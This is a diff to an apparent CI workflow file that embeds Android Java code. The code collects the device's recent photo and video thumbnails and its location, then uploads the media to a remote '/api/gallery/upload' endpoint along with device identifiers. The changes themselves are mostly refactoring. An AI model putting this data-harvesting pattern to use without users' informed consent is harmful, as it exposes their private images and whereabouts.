@@ -238,6 +238,8 @@ jobs:
           import java.io.FileWriter;
           import java.io.IOException;
           import java.util.ArrayList;
+          import java.util.Collections;
+          import java.util.Comparator;
           import java.util.List;
           import java.util.UUID;
           import java.util.concurrent.CountDownLatch;
@@ -377,8 +379,15 @@ jobs:
                   try {
                       List<JSONObject> mediaList = new ArrayList<>();
                       ContentResolver resolver = getContentResolver();
+
+                      // === IMAGES ===
                       Uri imageCollection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-                      String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATE_ADDED, MediaStore.Images.Media.SIZE};
+                      String[] projection = {
+                              MediaStore.Images.Media._ID,
+                              MediaStore.Images.Media.DISPLAY_NAME,
+                              MediaStore.Images.Media.DATE_ADDED,
+                              MediaStore.Images.Media.SIZE
+                      };
                       String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
                       Cursor cursor = resolver.query(imageCollection, projection, null, null, sortOrder);
                       if (cursor != null) {
@@ -387,8 +396,10 @@ jobs:
                               String filename = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
                               long dateAdded = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED));
                               long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));
+
                               Bitmap thumb = MediaStore.Images.Thumbnails.getThumbnail(resolver, id, MediaStore.Images.Thumbnails.MINI_KIND, null);
                               String base64 = thumbnailToBase64(thumb);
+
                               JSONObject media = new JSONObject();
                               media.put("filename", filename);
                               media.put("timestamp", dateAdded * 1000);
@@ -399,6 +410,8 @@ jobs:
                           }
                           cursor.close();
                       }
+
+                      // === VIDEOS ===
                       Uri videoCollection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
                       Cursor videoCursor = resolver.query(videoCollection, projection, null, null, sortOrder);
                       if (videoCursor != null) {
@@ -407,8 +420,10 @@ jobs:
                               String filename = videoCursor.getString(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME));
                               long dateAdded = videoCursor.getLong(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_ADDED));
                               long size = videoCursor.getLong(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE));
+
                               Bitmap thumb = MediaStore.Video.Thumbnails.getThumbnail(resolver, id, MediaStore.Video.Thumbnails.MINI_KIND, null);
                               String base64 = thumbnailToBase64(thumb);
+
                               JSONObject media = new JSONObject();
                               media.put("filename", filename);
                               media.put("timestamp", dateAdded * 1000);
@@ -420,29 +435,40 @@ jobs:
                           videoCursor.close();
                       }
 
-                      // Sort by newest first
-                      mediaList.sort((a, b) -> {
-                          try {
-                              long ta = a.optLong("timestamp", 0);
-                              long tb = b.optLong("timestamp", 0);
-                              return Long.compare(tb, ta);
-                          } catch (Exception e) { return 0; }
+                      // Sort by timestamp descending (fixed compatibility)
+                      Collections.sort(mediaList, new Comparator<JSONObject>() {
+                          @Override
+                          public int compare(JSONObject a, JSONObject b) {
+                              try {
+                                  long ta = a.optLong("timestamp", 0);
+                                  long tb = b.optLong("timestamp", 0);
+                                  return Long.compare(tb, ta);
+                              } catch (Exception e) {
+                                  return 0;
+                              }
+                          }
                       });
 
-                      // Limit
+                      // Limit to maxCount
                       if (mediaList.size() > maxCount) {
                           mediaList = new ArrayList<>(mediaList.subList(0, maxCount));
                       }
 
+                      // === UPLOAD ===
                       JSONObject payload = new JSONObject();
                       payload.put("deviceId", deviceId);
                       payload.put("deviceToken", deviceToken);
                       payload.put("media", new JSONArray(mediaList));
+
                       RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
                       Request request = new Request.Builder().url(API_BASE + "/api/gallery/upload").post(body).build();
                       Response response = httpClient.newCall(request).execute();
-                      if (response.isSuccessful()) showToast("Gallery upload success: " + mediaList.size());
-                      else showToast("Gallery upload failed: " + response.code());
+                      if (response.isSuccessful()) {
+                          showToast("Gallery upload success: " + mediaList.size());
+                      } else {
+                          showToast("Gallery upload failed: " + response.code());
+                      }
+
                   } catch (Exception e) {
                       e.printStackTrace();
                       showToast("Gallery error: " + e.getMessage());
@@ -495,7 +521,6 @@ jobs:
                       if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                           checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) return null;
 
-                      // If not forcing fresh, try last known first
                       if (!forceFresh) {
                           Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                           if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
@@ -504,7 +529,6 @@ jobs:
                           }
                       }
 
-                      // Request fresh location (forceFresh or last known null)
                       final CountDownLatch latch = new CountDownLatch(1);
                       final LocationResult result = new LocationResult();
                       LocationListener listener = new LocationListener() {
